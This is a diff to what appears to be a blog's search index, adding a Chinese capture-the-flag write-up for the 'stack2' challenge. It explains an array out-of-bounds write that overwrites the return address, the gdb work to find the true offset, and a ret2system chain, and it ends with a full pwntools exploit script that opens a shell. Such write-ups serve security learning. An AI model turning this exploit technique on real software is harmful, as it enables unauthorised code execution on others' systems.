@@ -45,4 +45,19 @@
     <url>/2022/01/08/%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[]]></content>
   </entry>
+  <entry>
+    <title>攻防世界-stack2</title>
+    <url>/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/</url>
+    <content><![CDATA[<p>关键词：数组溢出，栈溢出</p>
+<p>检查防护，32位程序，开启了NX和cannry<br><img src="/images/pasted-10.png" alt="upload successful"><br>运行程序<br><img src="/images/pasted-11.png" alt="upload successful"><br>在ida中查看，程序中的change number功能可以溢出数组，更改数组任意位置的值。程序中存在hacktherede函数<br><img src="/images/pasted-12.png" alt="upload successful">到这里做题的思路基本就有了，通过数组溢出的漏洞直接更改return的地址为hackhere的地址。<br>然而在做题的过程中发现这题有大坑，首先是程序的入口和出口进行了微调，ida中查看的栈的偏移不准确。用gdb调试程序，在mov     [eax], cl和retn的位置下断点<br><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p><img src="/images/pasted-14.png" alt="upload successful"><br>在mov eax，cl位置查看的返回地址是0xffffbd8c，而在retn位置查看的返回地址是0xffffbd9c<br><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><img src="/images/pasted-16.png" alt="upload successful"><br>所以真实的偏移地址是0x84，通过数组溢出更改返回地址，但是在第一次运行脚本时发现程序中没有bash，无法直接用后门函数后的shell。那么只能自己构造ROP，在程序中找到了“sh”的字符串，把system得plt地址以及sh的地址发送过去，可以成功获取shell。<br><img src="/images/pasted-17.png" alt="upload successful"><br>运行结果以及完整wp  </p>
+<p>from pwn import *<br>io = process(“./stack2”)<br>#io = remote(“111.200.241.244”,50757)<br>def SEND(aa,bb): </p>
+<pre><code>        io.sendlineafter(&#39;exit\n&#39;, b&#39;3&#39;)  
+        io.sendlineafter(&#39;to change:\n&#39;, str(aa))  
+        io.sendlineafter(&#39;new number:\n&#39;, str(bb))
+</code></pre>
+<p>system_add = 0x8048450<br>sh_add = 0x08048987<br>io.sendline(b’1’)<br>io.sendline(b’1’)<br>#system<br>SEND(0x84,0x50)<br>SEND(0x85,0x84)<br>SEND(0x86,0x04)<br>SEND(0x87,0x08)<br>#sh<br>SEND(0x8c,0x87)<br>SEND(0x8d,0x89)<br>SEND(0x8e,0x04)<br>SEND(0x8f,0x08)<br>io.sendline(b’5’)<br>#io.recv()<br>io.interactive()<br><img src="/images/pasted-18.png" alt="upload successful"></p>
+]]></content>
+  </entry>
 </search>
